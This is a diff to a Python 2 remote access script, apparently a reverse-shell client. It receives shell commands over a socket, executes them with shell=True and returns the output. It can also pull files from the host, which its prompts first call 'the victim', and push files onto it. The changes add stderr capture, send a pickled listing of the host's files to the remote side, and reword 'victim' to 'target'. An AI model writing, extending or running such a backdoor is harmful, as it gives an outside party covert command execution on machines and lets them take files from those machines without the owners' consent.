@@ -6,6 +6,7 @@ import os
 import sys
 import socket
 import subprocess
+import pickle
 
 # checking file/directory match
 def find(name, path):
@@ -36,22 +37,20 @@ try:
 				commandToRun = client.recv(4096)
 				if commandToRun != "":
 					try:
-						output = subprocess.check_output(commandToRun, shell=True)
+						output = subprocess.check_output(commandToRun, stderr=subprocess.PIPE, shell=True)
 						client.sendall(output)
 					except subprocess.CalledProcessError as errorCmd:
-						#print "error code", errorCmd.returncode, errorCmd.output
 						client.sendall(errorCmd.output)
 				else:
 					client.close()
 					sys.exit()
 			except KeyboardInterrupt:
-				#print "\n Keyboard Interruption : Closing socket..."
 				client.close()
 				sys.exit()
 
-	elif action == "2":
+	if action == "2":
 		try:
-			waitingFilename = "Enter the filename to download from the victim : "
+			waitingFilename = "Enter the filename to download from the target : "
 			client.sendall(waitingFilename)
 			# Processing request 
 			sFilename = client.recv(256)
@@ -63,19 +62,29 @@ try:
 				openingFile.close()
 			if not os.path.exists(cwd+"/"+sFilename):
 				client.sendall("unknown")
+				listing = []
+				for root, dirs, files in os.walk(cwd):
+   					for r in files:
+						listing.append(r)
+				data = pickle.dumps(listing)
+				client.sendall(data)
+				sFilename = client.recv(256)
+				if sFilename != "":
+					openingFile = open(cwd+"/"+sFilename,"rb")
+					readingFile = openingFile.read(4096)
+					client.sendall(readingFile)
+					openingFile.close()
 		except socket.error, e:
 			errorcode=e[1]
 			print errorcode
 
-	elif action == "3":
+	if action == "3":
 		try:
-			waitingFilename = "Enter the filename to upload to the victim : "
+			waitingFilename = "Enter the filename to transfer on the target : "
 			client.sendall(waitingFilename)
 			#processing request
 			Filename = client.recv(256)
-			#print Filename
 			if Filename != "":
-				print Filename
 				clientFiledata = "tmp"	
 				clientFiledata = client.recv(4096)
 				uploadedFile = open(Filename, "wb")
@@ -88,9 +97,6 @@ try:
 				client.sendall("[*] File successfully transfered !")
 		except:
 			pass
-	else:
-		pass
-		
 except socket.error, e:
 	errorcode=e[1]
 	print errorcode
